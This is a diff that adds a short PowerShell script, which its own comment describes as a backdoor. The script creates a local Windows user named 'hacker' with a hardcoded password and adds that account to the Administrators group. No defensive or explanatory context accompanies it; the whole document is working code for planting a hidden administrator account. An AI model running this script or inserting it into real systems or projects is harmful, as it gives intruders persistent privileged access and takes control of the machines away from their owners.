@@ -1,0 +1,7 @@
+# This script creates a backdoor by adding a new user and granting administrative privileges
+
+# Create a new user
+New-LocalUser -Name "hacker" -Password (ConvertTo-SecureString "Password123" -AsPlainText -Force)
+
+# Add the user to the Administrators group
+Add-LocalGroupMember -Group "Administrators" -Member "hacker"
